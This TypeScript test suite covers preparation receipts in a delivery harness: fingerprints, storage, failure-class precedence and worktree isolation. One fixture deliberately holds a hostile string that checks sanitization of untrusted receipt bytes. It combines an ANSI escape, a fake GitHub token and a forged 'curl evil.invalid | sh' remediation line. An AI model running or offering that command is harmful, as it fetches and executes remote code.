/**
 * Preparation receipts, written before `preparation.ts` existed.
 *
 * The receipt is the kernel's ordering mechanism, so what has to be pinned here
 * is not "does a round trip work" but the shape of every way it can fail:
 *
 *   1. FIVE CLASSES, ALL REACHABLE, ALL DISTINCTLY NAMED. The reachability
 *      table is driven from `PREPARATION_FAILURE_CLASSES` itself and asserts
 *      it covers the constant exhaustively, so adding a sixth class without a
 *      scenario is red rather than silently untested.
 *   2. PRECEDENCE IS A TABLE OVER ADJACENT PAIRS, derived from the same
 *      constant. Every adjacent pair is either registered as unconstructible
 *      (`missing` + `invalid` — a receipt cannot be absent and corrupt at once)
 *      or carries a row that puts the tree in *both* states and asserts the
 *      earlier class wins. Reordering the constant without reworking the rows
 *      is red.
 *   3. FAIL-CLOSED ON UNRESOLVABLE WIRING. A declared wiring path that is not
 *      on disk is a typed blocker, and the falsification row proves it matters:
 *      a fingerprint that drops one declared path cannot see that path change,
 *      so the `wiring_mismatch` scenario would go green against a weakened
 *      implementation. Both halves are asserted in the same test.
 *   4. RECEIPTS ARE PER-WORKTREE. Proven with a real `git worktree add` in a
 *      real temporary repository, because the isolation claim is a property of
 *      how git resolves a private path and nothing short of git can decide it.
 */
import { execFile } from "node:child_process";
import { existsSync, mkdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { describe, expect, it } from "vitest";
import { BlockedError, MAX_BLOCKER_DETAIL_LENGTH, renderBlockers } from "./blockers.ts";
import { CANDIDATE_MODES, type CandidateMode } from "./candidate.types.ts";
import { GATE_STRUCTURAL_FINDING_CODES } from "./blockers.ts";
import { defineHarnessConfig, type HarnessConfig, type HarnessConfigInput } from "./config.ts";
import { sha256Hex } from "./digest.ts";
import { resolveRecordStorage } from "./records.ts";
import {
  HARNESS_VERSION,
  PREPARATION_FAILURE_CLASSES,
  PREPARATION_RECEIPT_LEAF,
  PREPARATION_RECEIPT_SCHEMA_VERSION,
  computePreparationFingerprint,
  evaluatePreparationReceipt,
  publishPreparationReceipt,
  receiptFileName,
  resolveReceiptStorage,
  type PreparationCandidate,
  type PreparationEvaluation,
  type PreparationFailureClass,
} from "./preparation.ts";

const run = promisify(execFile);

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../../..");

// ── Fixtures ───────────────────────────────────────────────────────────────

const WIRING_PATHS = ["harness.config.ts", "tooling/gate/wiring.json", "scripts/prepare.ts"] as const;

const WIRING_BYTES: Readonly<Record<string, string>> = {
  "harness.config.ts": "export default { gateId: 'test.gate' };\n",
  "tooling/gate/wiring.json": '{"providers":["test.provider"]}\n',
  "scripts/prepare.ts": "await prepare();\n",
};

function testConfig(overrides: Partial<HarnessConfigInput> = {}): HarnessConfig {
  return defineHarnessConfig({
    gateId: "test.gate",
    acceptedEnvelopeSpecs: ["delivery-evidence/1"],
    identityVersions: ["test-tree/v1"],
    computingIdentityVersion: "test-tree/v1",
    reviewNeutral: [{ prefix: "docs/narration/" }, { prefix: "delivery/records/" }],
    recordNeutral: [{ prefix: "delivery/records/" }],
    pathClassification: {
      generated: [{ kind: "prefix", value: "generated/" }],
      test: [{ kind: "glob", value: "**/*.test.ts" }],
      lockfile: [{ kind: "glob", value: "**/package-lock.json" }],
    },
    sensitivePaths: [{ id: "auth", patterns: [{ kind: "prefix", value: "packages/auth" }] }],
    activationThreshold: 50,
    providers: [{ id: "test.provider", findingCodes: ["provider-finding"] }],
    agentEnvSignals: ["TEST_AGENT"],
    ciPolicies: [],
    ciPolicyEnvKey: "TEST_CI_POLICY",
    preparationWiringPaths: [...WIRING_PATHS],
    obligations: [
      {
        id: "review.green",
        activation: { kind: "relevant_change" },
        freshness: "exact_candidate",
        providers: ["test.provider"],
        acceptedPayloadSpecs: ["review.green/1"],
        allowedResolutionKinds: ["satisfied_evidence"],
        humanWaiverAllowed: false,
        minimumAttestationLevel: "self",
        ciDelegationPolicyIds: [],
        remediation: {
          default: [{ id: "complete-review", kind: "manual_action", summary: "Complete a review for this candidate." }],
        },
        waivableCodes: [],
        nonWaivableCodes: [...GATE_STRUCTURAL_FINDING_CODES, "provider-finding"],
      },
    ],
    deliveryRecordPath: "delivery/records/latest.json",
    ...overrides,
  });
}

const CONFIG = testConfig();

function candidate(overrides: Partial<PreparationCandidate> = {}): PreparationCandidate {
  return {
    treeSha: "a".repeat(40),
    headSha: "b".repeat(40),
    mode: "clean" satisfies CandidateMode,
    deliverable: { digest: "c".repeat(64), identity: "test-tree/v1" },
    base: { ref: "origin/main", tipSha: "d".repeat(40), mergeBaseSha: "e".repeat(40) },
    workspaceId: "f".repeat(64),
    ...overrides,
  };
}

// ── Temporary trees ────────────────────────────────────────────────────────

/**
 * Deliberately not realpathed: macOS hands out `/var` temporaries that are
 * really `/private/var`, and the workspace id must be the same either way.
 */
async function tempDir(label: string): Promise<string> {
  return mkdtemp(path.join(tmpdir(), `dh-prep-${label}-`));
}

interface Tree {
  /** The working tree the wiring paths are read from. */
  readonly rootDir: string;
  /** An injected namespace root — no repository required. */
  readonly storageRoot: string;
}

async function tempTree(label = "tree"): Promise<Tree> {
  const rootDir = await tempDir(label);
  for (const repoPath of WIRING_PATHS) writeWiring(rootDir, repoPath, WIRING_BYTES[repoPath] as string);
  return { rootDir, storageRoot: path.join(rootDir, ".git-private", "delivery-harness") };
}

function writeWiring(rootDir: string, repoPath: string, contents: string): void {
  const target = path.join(rootDir, repoPath);
  mkdirSync(path.dirname(target), { recursive: true });
  writeFileSync(target, contents, "utf8");
}

async function git(cwd: string, ...args: readonly string[]): Promise<string> {
  const { stdout } = await run("git", [...args], { cwd });
  return stdout.trim();
}

/** A real repository with one commit — enough for `git worktree add`. */
async function tempRepo(label = "repo"): Promise<string> {
  const dir = await tempDir(label);
  await git(dir, "init", "--quiet", "--initial-branch", "main");
  await git(dir, "config", "user.email", "harness@example.invalid");
  await git(dir, "config", "user.name", "Delivery Harness");
  await git(dir, "commit", "--quiet", "--allow-empty", "--no-gpg-sign", "-m", "root");
  for (const repoPath of WIRING_PATHS) writeWiring(dir, repoPath, WIRING_BYTES[repoPath] as string);
  return dir;
}

// ── Fingerprint ────────────────────────────────────────────────────────────

describe("the preparation fingerprint", () => {
  it("is a sha256 hex digest over the harness version and the declared wiring bytes", async () => {
    const tree = await tempTree();
    const fingerprint = await computePreparationFingerprint(tree.rootDir, CONFIG);
    expect(fingerprint).toMatch(/^[0-9a-f]{64}$/);
    expect(await computePreparationFingerprint(tree.rootDir, CONFIG)).toBe(fingerprint);
  });

  it("moves when the harness version moves, with byte-identical wiring", async () => {
    const tree = await tempTree();
    const before = await computePreparationFingerprint(tree.rootDir, CONFIG);
    const after = await computePreparationFingerprint(tree.rootDir, CONFIG, { harnessVersion: `${HARNESS_VERSION}-next` });
    expect(after).not.toBe(before);
  });

  it("declares a version that matches the kernel package manifest", () => {
    const manifest = JSON.parse(readFileSync(path.join(REPO_ROOT, "packages/kernel/package.json"), "utf8")) as {
      version: string;
    };
    expect(HARNESS_VERSION).toBe(manifest.version);
  });

  it("does not depend on the order the config declares the paths in, nor on repetition", async () => {
    const tree = await tempTree();
    const straight = await computePreparationFingerprint(tree.rootDir, CONFIG);
    const shuffled = testConfig({ preparationWiringPaths: [...WIRING_PATHS].reverse() });
    const repeated = testConfig({ preparationWiringPaths: [...WIRING_PATHS, WIRING_PATHS[0]] });
    expect(await computePreparationFingerprint(tree.rootDir, shuffled)).toBe(straight);
    expect(await computePreparationFingerprint(tree.rootDir, repeated)).toBe(straight);
  });

  /**
   * THE FALSIFICATION. Each row changes exactly one declared wiring path and
   * requires the fingerprint to move — and then computes what a fingerprint
   * that had *dropped* that path from its input would have produced, and
   * requires that weakened value to be blind to the same change. Without the
   * second half the row would pass against an implementation that hashed one
   * lucky path; with it, dropping any declared path from the real computation
   * turns this test red.
   */
  it.each(WIRING_PATHS)("notices a change to the declared wiring path %s, and a fingerprint without it does not", async (moved) => {
    const tree = await tempTree();
    const withoutMoved = testConfig({ preparationWiringPaths: WIRING_PATHS.filter((entry) => entry !== moved) });

    const before = await computePreparationFingerprint(tree.rootDir, CONFIG);
    const weakenedBefore = await computePreparationFingerprint(tree.rootDir, withoutMoved);

    writeWiring(tree.rootDir, moved, `${WIRING_BYTES[moved] as string}// moved\n`);

    expect(await computePreparationFingerprint(tree.rootDir, CONFIG)).not.toBe(before);
    expect(await computePreparationFingerprint(tree.rootDir, withoutMoved)).toBe(weakenedBefore);
  });

  /**
   * Each wiring entry contributes its declared path alongside its content
   * digest. Without the pairing, two configs that hash the same bytes from
   * different files agree — so moving a gate's wiring from one declared path
   * to another, or swapping which of two identical files is declared, would
   * leave a receipt looking current for wiring it was not published against.
   * This row is red against an implementation that pushes bare digests.
   */
  it("distinguishes identical bytes declared at two different paths", async () => {
    const tree = await tempTree("pairing");
    const shared = "the same bytes, in two files\n";
    writeWiring(tree.rootDir, "wiring/left.json", shared);
    writeWiring(tree.rootDir, "wiring/right.json", shared);

    const left = await computePreparationFingerprint(tree.rootDir, testConfig({ preparationWiringPaths: ["wiring/left.json"] }));
    const right = await computePreparationFingerprint(tree.rootDir, testConfig({ preparationWiringPaths: ["wiring/right.json"] }));
    expect(left).not.toBe(right);
  });

  it("refuses to hash a declared wiring path that is absent from disk", async () => {
    const tree = await tempTree();
    rmSync(path.join(tree.rootDir, "scripts/prepare.ts"));
    const error = await computePreparationFingerprint(tree.rootDir, CONFIG).catch((thrown: unknown) => thrown);
    expect(error).toBeInstanceOf(BlockedError);
    const blockers = (error as BlockedError).blockers;
    expect(blockers[0]?.code).toBe("preparation_wiring_unresolvable");
    expect(blockers[0]?.source.kind).toBe("preparation");
    expect(blockers[0]?.details).toContain("scripts/prepare.ts");
  });

  it("refuses a declared wiring path that is a directory rather than a file", async () => {
    const tree = await tempTree();
    const error = await computePreparationFingerprint(tree.rootDir, testConfig({ preparationWiringPaths: ["tooling"] })).catch(
      (thrown: unknown) => thrown,
    );
    expect(error).toBeInstanceOf(BlockedError);
    expect((error as BlockedError).blockers[0]?.code).toBe("preparation_wiring_unresolvable");
  });
});

// ── Storage ────────────────────────────────────────────────────────────────

describe("receipt storage", () => {
  it("shares the namespace root and the workspace id with the record store, under its own leaf", async () => {
    const repo = await tempRepo("shared-root");
    const records = await resolveRecordStorage(repo, {});
    const receipts = await resolveReceiptStorage(repo, {});
    expect(receipts.storageRoot).toBe(records.storageRoot);
    expect(receipts.workspaceId).toBe(records.workspaceId);
    expect(receipts.storageDir).toBe(path.join(records.storageRoot, PREPARATION_RECEIPT_LEAF));
    expect(receipts.storageDir).not.toBe(records.storageDir);
  });

  it("names the receipt after the gate and files it inside the git directory", async () => {
    const repo = await tempRepo("gate-named");
    const published = await publishPreparationReceipt(repo, { config: CONFIG, candidate: candidate() });
    const gitDir = await git(repo, "rev-parse", "--absolute-git-dir");
    expect(path.basename(published.path)).toBe(receiptFileName(CONFIG.gateId));
    expect(published.path.startsWith(`${path.dirname(gitDir)}${path.sep}`)).toBe(true);
    expect(existsSync(published.path)).toBe(true);
  });
});

// ── Publication ────────────────────────────────────────────────────────────

describe("publication", () => {
  it("writes an owner-only receipt carrying the candidate coordinates and the fingerprint", async () => {
    const tree = await tempTree();
    const subject = candidate();
    const published = await publishPreparationReceipt(
      tree.rootDir,
      { config: CONFIG, candidate: subject },
      { storageRoot: tree.storageRoot },
    );

    expect(published.receipt.schemaVersion).toBe(PREPARATION_RECEIPT_SCHEMA_VERSION);
    expect(published.receipt.gateId).toBe(CONFIG.gateId);
    expect(published.receipt.treeSha).toBe(subject.treeSha);
    expect(published.receipt.headSha).toBe(subject.headSha);
    expect(published.receipt.mode).toBe(subject.mode);
    expect(published.receipt.deliverableDigest).toBe(subject.deliverable.digest);
    expect(published.receipt.identityToken).toBe(subject.deliverable.identity);
    expect(published.receipt.baseRef).toBe(subject.base.ref);
    expect(published.receipt.baseTipSha).toBe(subject.base.tipSha);
    expect(published.receipt.mergeBaseSha).toBe(subject.base.mergeBaseSha);
    expect(published.receipt.candidateWorkspaceId).toBe(subject.workspaceId);
    expect(published.receipt.workspaceId).toBe(published.workspaceId);
    expect(published.receipt.preparationFingerprint).toBe(await computePreparationFingerprint(tree.rootDir, CONFIG));

    expect(statSync(published.path).mode & 0o777).toBe(0o600);
    expect(statSync(path.dirname(published.path)).mode & 0o777).toBe(0o700);
  });

  it("carries no timestamp — nothing in the receipt is decided by consulting a clock", async () => {
    const tree = await tempTree();
    const published = await publishPreparationReceipt(
      tree.rootDir,
      { config: CONFIG, candidate: candidate() },
      { storageRoot: tree.storageRoot },
    );
    const stored = JSON.parse(readFileSync(published.path, "utf8")) as Record<string, unknown>;
    expect(Object.keys(stored)).not.toContain("preparedAt");
    expect(Object.keys(stored)).not.toContain("recordedAt");
  });

  it("replaces the previous receipt rather than accumulating one per preparation", async () => {
    const tree = await tempTree();
    const first = await publishPreparationReceipt(
      tree.rootDir,
      { config: CONFIG, candidate: candidate() },
      { storageRoot: tree.storageRoot },
    );
    const second = await publishPreparationReceipt(
      tree.rootDir,
      { config: CONFIG, candidate: candidate({ treeSha: "9".repeat(40) }) },
      { storageRoot: tree.storageRoot },
    );
    expect(second.path).toBe(first.path);
    expect(second.receipt.treeSha).toBe("9".repeat(40));
    expect(JSON.parse(readFileSync(first.path, "utf8")).treeSha).toBe("9".repeat(40));
  });

  it("publishes nothing at all when a declared wiring path is absent", async () => {
    const tree = await tempTree();
    rmSync(path.join(tree.rootDir, "tooling/gate/wiring.json"));
    const error = await publishPreparationReceipt(
      tree.rootDir,
      { config: CONFIG, candidate: candidate() },
      { storageRoot: tree.storageRoot },
    ).catch((thrown: unknown) => thrown);

    expect(error).toBeInstanceOf(BlockedError);
    expect((error as BlockedError).blockers[0]?.code).toBe("preparation_wiring_unresolvable");
    expect(existsSync(path.join(tree.storageRoot, PREPARATION_RECEIPT_LEAF, receiptFileName(CONFIG.gateId)))).toBe(false);
  });
});

// ── The five classes ───────────────────────────────────────────────────────

async function prepared(tree: Tree, subject: PreparationCandidate = candidate()): Promise<string> {
  const published = await publishPreparationReceipt(
    tree.rootDir,
    { config: CONFIG, candidate: subject },
    { storageRoot: tree.storageRoot },
  );
  return published.path;
}

function evaluate(tree: Tree, subject: PreparationCandidate = candidate()): Promise<PreparationEvaluation> {
  return evaluatePreparationReceipt(tree.rootDir, { config: CONFIG, candidate: subject }, { storageRoot: tree.storageRoot });
}

function failure(evaluation: PreparationEvaluation): PreparationFailureClass {
  if (evaluation.prepared) throw new Error("expected a failed evaluation");
  return evaluation.failure;
}

/**
 * One scenario per class. The table below is checked against
 * `PREPARATION_FAILURE_CLASSES` for exhaustiveness, so a class added to the
 * kernel without a scenario here is a red run rather than a quiet gap.
 */
const SCENARIOS: Readonly<Record<PreparationFailureClass, (tree: Tree) => Promise<PreparationEvaluation>>> = {
  missing: async (tree) => evaluate(tree),
  invalid: async (tree) => {
    const receiptPath = await prepared(tree);
    writeFileSync(receiptPath, "{ this is not json", "utf8");
    return evaluate(tree);
  },
  wiring_mismatch: async (tree) => {
    await prepared(tree);
    writeWiring(tree.rootDir, "tooling/gate/wiring.json", '{"providers":["test.provider","other"]}\n');
    return evaluate(tree);
  },
  base_changed: async (tree) => {
    await prepared(tree);
    return evaluate(tree, candidate({ base: { ref: "origin/main", tipSha: "1".repeat(40), mergeBaseSha: "2".repeat(40) } }));
  },
  stale: async (tree) => {
    await prepared(tree);
    return evaluate(tree, candidate({ treeSha: "3".repeat(40) }));
  },
};

describe("evaluation", () => {
  it("accepts an unchanged candidate against its own receipt", async () => {
    const tree = await tempTree();
    const receiptPath = await prepared(tree);
    const evaluation = await evaluate(tree);
    expect(evaluation.prepared).toBe(true);
    if (!evaluation.prepared) return;
    expect(evaluation.receiptPath).toBe(receiptPath);
    expect(evaluation.receipt.treeSha).toBe(candidate().treeSha);
  });

  it("covers every declared failure class with a scenario", () => {
    expect(Object.keys(SCENARIOS).sort()).toEqual([...PREPARATION_FAILURE_CLASSES].sort());
  });

  it.each(PREPARATION_FAILURE_CLASSES)("reaches the %s class", async (expected) => {
    const tree = await tempTree(expected);
    const evaluation = await SCENARIOS[expected](tree);
    expect(failure(evaluation)).toBe(expected);
  });

  it.each(PREPARATION_FAILURE_CLASSES)("names the %s class distinctly on its blocker", async (expected) => {
    const tree = await tempTree(`code-${expected}`);
    const evaluation = await SCENARIOS[expected](tree);
    if (evaluation.prepared) throw new Error("expected a failed evaluation");
    expect(evaluation.blockers[0]?.code).toBe(`preparation_${expected}`);
    expect(evaluation.blockers[0]?.source).toEqual({ kind: "preparation", id: expected });
    expect(evaluation.blockers[0]?.remediations.length).toBeGreaterThan(0);
  });

  it("gives the five classes five distinct blocker codes", async () => {
    const codes = new Set<string>();
    for (const expected of PREPARATION_FAILURE_CLASSES) {
      const tree = await tempTree(`distinct-${expected}`);
      const evaluation = await SCENARIOS[expected](tree);
      if (evaluation.prepared) throw new Error("expected a failed evaluation");
      codes.add(evaluation.blockers[0]?.code as string);
    }
    expect(codes.size).toBe(PREPARATION_FAILURE_CLASSES.length);
  });

  it("rejects a receipt published against a different gate", async () => {
    const tree = await tempTree("foreign-gate");
    await prepared(tree);
    const other = testConfig({ gateId: "other.gate" });
    const evaluation = await evaluatePreparationReceipt(
      tree.rootDir,
      { config: other, candidate: candidate() },
      { storageRoot: tree.storageRoot },
    );
    // A different gate files its receipt under a different name, so nothing is
    // there to read: the class is `missing`, not a cross-gate acceptance.
    expect(failure(evaluation)).toBe("missing");
  });

  it("rejects a receipt carrying another workspace's id as invalid, not as stale", async () => {
    const tree = await tempTree("foreign-workspace");
    const receiptPath = await prepared(tree);
    const stored = JSON.parse(readFileSync(receiptPath, "utf8")) as Record<string, unknown>;
    writeFileSync(receiptPath, `${JSON.stringify({ ...stored, workspaceId: sha256Hex("elsewhere") }, null, 2)}\n`, "utf8");
    expect(failure(await evaluate(tree))).toBe("invalid");
  });

  it("rejects a receipt from an unsupported schema version as invalid", async () => {
    const tree = await tempTree("schema");
    const receiptPath = await prepared(tree);
    const stored = JSON.parse(readFileSync(receiptPath, "utf8")) as Record<string, unknown>;
    writeFileSync(
      receiptPath,
      `${JSON.stringify({ ...stored, schemaVersion: PREPARATION_RECEIPT_SCHEMA_VERSION + 1 }, null, 2)}\n`,
      "utf8",
    );
    expect(failure(await evaluate(tree))).toBe("invalid");
  });

  it("calls a head move with an identical tree stale", async () => {
    const tree = await tempTree("head-move");
    await prepared(tree);
    expect(failure(await evaluate(tree, candidate({ headSha: "7".repeat(40) })))).toBe("stale");
  });

  it("calls a moved deliverable digest stale even when the raw tree is unchanged", async () => {
    const tree = await tempTree("digest-move");
    await prepared(tree);
    const moved = candidate({ deliverable: { digest: "8".repeat(64), identity: "test-tree/v1" } });
    expect(failure(await evaluate(tree, moved))).toBe("stale");
  });

  it("calls a moved base ref base_changed", async () => {
    const tree = await tempTree("base-ref");
    await prepared(tree);
    const moved = candidate({ base: { ref: "origin/release", tipSha: "d".repeat(40), mergeBaseSha: "e".repeat(40) } });
    expect(failure(await evaluate(tree, moved))).toBe("base_changed");
  });

  it("bumping the harness version alone lands as wiring_mismatch", async () => {
    const tree = await tempTree("version-bump");
    await prepared(tree);
    const evaluation = await evaluatePreparationReceipt(
      tree.rootDir,
      { config: CONFIG, candidate: candidate() },
      { storageRoot: tree.storageRoot, harnessVersion: `${HARNESS_VERSION}-next` },
    );
    expect(failure(evaluation)).toBe("wiring_mismatch");
  });
});

// ── Candidate modes ────────────────────────────────────────────────────────

/** Rewrites members of a stored receipt in place, keeping it valid JSON. */
function tamper(receiptPath: string, changes: Readonly<Record<string, unknown>>): void {
  const stored = JSON.parse(readFileSync(receiptPath, "utf8")) as Record<string, unknown>;
  writeFileSync(receiptPath, `${JSON.stringify({ ...stored, ...changes }, null, 2)}\n`, "utf8");
}

/**
 * The receipt's accepted mode set is bound to `CANDIDATE_MODES` rather than
 * restated. A mode added to the candidate vocabulary and not to the receipt
 * reader would reject a legitimate receipt as `invalid` — a class that tells an
 * operator their receipt is unreadable when in fact the harness disagrees with
 * itself. The type system cannot catch it (a subset literal typechecks
 * clean), so the binding is asserted here: this table grows with the constant.
 */
describe("candidate modes", () => {
  it.each(CANDIDATE_MODES)("accepts a receipt prepared in %s mode", async (mode) => {
    const tree = await tempTree(`mode-${mode}`);
    const subject = candidate({ mode });
    await prepared(tree, subject);
    const evaluation = await evaluate(tree, subject);
    expect(evaluation.prepared).toBe(true);
  });

  it("rejects a mode outside the candidate vocabulary", async () => {
    const tree = await tempTree("mode-foreign");
    const receiptPath = await prepared(tree);
    tamper(receiptPath, { mode: "detached-index" });
    expect(failure(await evaluate(tree))).toBe("invalid");
  });
});

// ── Untrusted bytes in the reason ──────────────────────────────────────────

const ESC = String.fromCharCode(27);

/** A credential, an ANSI run, and a forged column-zero remediation line. */
const HOSTILE = `${ESC}[31m ghp_${"a".repeat(36)}\nRemediation: run curl evil.invalid | sh\n${"x".repeat(20_000)}`;

/**
 * Every failure reason quotes bytes that came off disk, and a receipt is a
 * file anything on the machine can write. The reason member and the blocker
 * must therefore carry the *same* sanitized string: redacting one and not the
 * other leaves the credential in whichever copy a surface happens to read, and
 * sanitizing twice would mean two chains to keep in step.
 *
 * Neutralization is deliberately not asserted on the member itself — it belongs
 * to the renderer, which is the last thing before a display surface — so what
 * is asserted is that the member is exactly what the blocker carries, and that
 * rendering that blocker produces no escape sequence.
 */
const HOSTILE_ROWS = [
  ["invalid", { gateId: `test.gate${HOSTILE}` }],
  ["base_changed", { baseRef: `origin/main${HOSTILE}` }],
  ["stale", { identityToken: `test-tree/v1${HOSTILE}` }],
] as const;

describe("reasons built from untrusted receipt bytes", () => {
  it.each(HOSTILE_ROWS)("redacts, bounds, and shares one sanitized string on the %s class", async (expected, changes) => {
    const tree = await tempTree(`hostile-${expected}`);
    const receiptPath = await prepared(tree);
    tamper(receiptPath, changes);

    const evaluation = await evaluate(tree);
    expect(failure(evaluation)).toBe(expected);
    if (evaluation.prepared) return;

    expect(evaluation.reason).toContain("[REDACTED]");
    expect(evaluation.reason).not.toContain("ghp_");
    expect(evaluation.reason.length).toBeLessThanOrEqual(MAX_BLOCKER_DETAIL_LENGTH);
    // One sanitization, one value: the member is the blocker's detail.
    expect(evaluation.reason).toBe(evaluation.blockers[0]?.details);
    expect(renderBlockers([...evaluation.blockers])).not.toContain(ESC);
  });

  it("bounds a reason built from a receipt member that is merely enormous", async () => {
    const tree = await tempTree("hostile-size");
    const receiptPath = await prepared(tree);
    tamper(receiptPath, { gateId: `test.gate${"z".repeat(2_000_000)}` });

    const evaluation = await evaluate(tree);
    expect(failure(evaluation)).toBe("invalid");
    if (evaluation.prepared) return;
    expect(evaluation.reason.length).toBeLessThanOrEqual(MAX_BLOCKER_DETAIL_LENGTH);
    expect(evaluation.reason).toBe(evaluation.blockers[0]?.details);
  });
});

// ── Precedence ─────────────────────────────────────────────────────────────

/**
 * The adjacent pairs, derived from the constant so the table cannot drift out
 * of step with the declared order.
 */
const ADJACENT_PAIRS = PREPARATION_FAILURE_CLASSES.flatMap((earlier, index) => {
  const later = PREPARATION_FAILURE_CLASSES[index + 1];
  return later === undefined ? [] : [[earlier, later] as const];
});

/**
 * `missing` + `invalid` is the one adjacent pair no tree can be put into: a
 * receipt cannot be simultaneously absent and corrupt. It is registered here
 * rather than omitted, so the coverage assertion below stays exhaustive.
 */
const UNCONSTRUCTIBLE_PAIRS = new Set<string>(["missing+invalid"]);

interface PrecedenceRow {
  /** Puts the tree into both states of the pair, and returns the evaluation. */
  readonly both: (tree: Tree) => Promise<PreparationEvaluation>;
}

const PRECEDENCE_ROWS: Readonly<Record<string, PrecedenceRow>> = {
  "invalid+wiring_mismatch": {
    both: async (tree) => {
      const receiptPath = await prepared(tree);
      writeFileSync(receiptPath, "not a receipt at all", "utf8");
      writeWiring(tree.rootDir, "scripts/prepare.ts", "await prepare({ again: true });\n");
      return evaluate(tree);
    },
  },
  "wiring_mismatch+base_changed": {
    both: async (tree) => {
      await prepared(tree);
      writeWiring(tree.rootDir, "scripts/prepare.ts", "await prepare({ again: true });\n");
      return evaluate(tree, candidate({ base: { ref: "origin/main", tipSha: "1".repeat(40), mergeBaseSha: "2".repeat(40) } }));
    },
  },
  // Also the plan's "candidate moved AND base advanced" row: the tree moved and
  // the base advanced together, which is what a rebase looks like.
  "base_changed+stale": {
    both: async (tree) => {
      await prepared(tree);
      return evaluate(
        tree,
        candidate({
          treeSha: "3".repeat(40),
          base: { ref: "origin/main", tipSha: "1".repeat(40), mergeBaseSha: "2".repeat(40) },
        }),
      );
    },
  },
};

describe("failure-class precedence", () => {
  it("declares the classes in the pinned order", () => {
    expect([...PREPARATION_FAILURE_CLASSES]).toEqual(["missing", "invalid", "wiring_mismatch", "base_changed", "stale"]);
  });

  it("has a row for every constructible adjacent pair", () => {
    const required = ADJACENT_PAIRS.map(([earlier, later]) => `${earlier}+${later}`).filter(
      (key) => !UNCONSTRUCTIBLE_PAIRS.has(key),
    );
    expect(Object.keys(PRECEDENCE_ROWS).sort()).toEqual([...required].sort());
  });

  it.each(ADJACENT_PAIRS.filter(([earlier, later]) => !UNCONSTRUCTIBLE_PAIRS.has(`${earlier}+${later}`)))(
    "reports %s rather than %s when both hold",
    async (earlier, later) => {
      const tree = await tempTree(`prec-${earlier}`);
      const row = PRECEDENCE_ROWS[`${earlier}+${later}`] as PrecedenceRow;
      const evaluation = await row.both(tree);
      expect(failure(evaluation)).toBe(earlier);
      expect(failure(evaluation)).not.toBe(later);
    },
  );

  it("reports missing ahead of every later class", async () => {
    const tree = await tempTree("missing-first");
    writeWiring(tree.rootDir, "scripts/prepare.ts", "await prepare({ never: true });\n");
    const evaluation = await evaluate(tree, candidate({ treeSha: "4".repeat(40) }));
    expect(failure(evaluation)).toBe("missing");
  });
});

// ── Worktree isolation ─────────────────────────────────────────────────────

describe("receipts are per-worktree", () => {
  it("does not serve a receipt published in the main worktree to a linked one", async () => {
    const repo = await tempRepo("isolation-main");
    const linked = path.join(path.dirname(repo), `${path.basename(repo)}-linked`);
    await git(repo, "worktree", "add", "--quiet", "-b", "feature", linked);
    for (const repoPath of WIRING_PATHS) writeWiring(linked, repoPath, WIRING_BYTES[repoPath] as string);

    const published = await publishPreparationReceipt(repo, { config: CONFIG, candidate: candidate() });
    expect(existsSync(published.path)).toBe(true);

    const fromLinked = await evaluatePreparationReceipt(linked, { config: CONFIG, candidate: candidate() });
    expect(failure(fromLinked)).toBe("missing");

    const mainStorage = await resolveReceiptStorage(repo, {});
    const linkedStorage = await resolveReceiptStorage(linked, {});
    expect(linkedStorage.storageDir).not.toBe(mainStorage.storageDir);
    expect(linkedStorage.workspaceId).not.toBe(mainStorage.workspaceId);
  });

  it("lets each worktree hold its own current receipt at the same time", async () => {
    const repo = await tempRepo("isolation-both");
    const linked = path.join(path.dirname(repo), `${path.basename(repo)}-linked`);
    await git(repo, "worktree", "add", "--quiet", "-b", "second", linked);
    for (const repoPath of WIRING_PATHS) writeWiring(linked, repoPath, WIRING_BYTES[repoPath] as string);

    const mainCandidate = candidate({ treeSha: "5".repeat(40) });
    const linkedCandidate = candidate({ treeSha: "6".repeat(40) });
    await publishPreparationReceipt(repo, { config: CONFIG, candidate: mainCandidate });
    await publishPreparationReceipt(linked, { config: CONFIG, candidate: linkedCandidate });

    const fromMain = await evaluatePreparationReceipt(repo, { config: CONFIG, candidate: mainCandidate });
    const fromLinked = await evaluatePreparationReceipt(linked, { config: CONFIG, candidate: linkedCandidate });
    expect(fromMain.prepared).toBe(true);
    expect(fromLinked.prepared).toBe(true);

    // Each worktree's receipt describes its own candidate, and neither has been
    // overwritten by the other.
    expect(failure(await evaluatePreparationReceipt(repo, { config: CONFIG, candidate: linkedCandidate }))).toBe("stale");
  });
});
